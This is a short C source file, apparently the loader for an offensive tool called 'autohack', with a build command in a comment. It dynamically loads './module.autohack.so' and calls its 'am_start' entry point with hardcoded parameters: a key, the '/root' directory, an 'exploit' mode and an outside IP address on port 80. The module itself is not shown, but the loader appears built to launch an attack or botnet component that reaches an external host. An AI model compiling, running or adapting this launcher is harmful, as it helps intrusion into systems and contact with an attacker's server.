#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

//gcc -std=c99 loader.autohack.c -o loader.autohack -ldl

struct params_t {
  char key[0x100];
  char p1[0x100];
  char p2[0x100];
  char p3[0x100];
  char p4[0x100];
  char p5[0x100];
};

typedef int (*am_start_t)(char *directory, unsigned int port, struct params_t *p);

int main() {
    am_start_t am_start = NULL;
    void* lib = NULL;
    char * plugin = "./module.autohack.so";
    char * function_name = "am_start";
    lib = dlopen(plugin, RTLD_NOW);
    if(!lib) {
        const char* dlopen_error = dlerror();
        printf("failed to open shared library: %s\n", dlopen_error);
        exit(-1);
    }
    am_start = (am_start_t)dlsym(lib, function_name);
    const char* dlsym_error = dlerror();
    if(dlsym_error) {
        printf("Cannot load symbol: %s\n", dlsym_error);
        exit(-1);
    }
    struct params_t params = {
        "0946993636", 
        "/root",
        "",
        "exploit",
        "2",
        "47.75.14.109"
    };
    char directory[] = "./";
    am_start(directory, 80, &params);
}
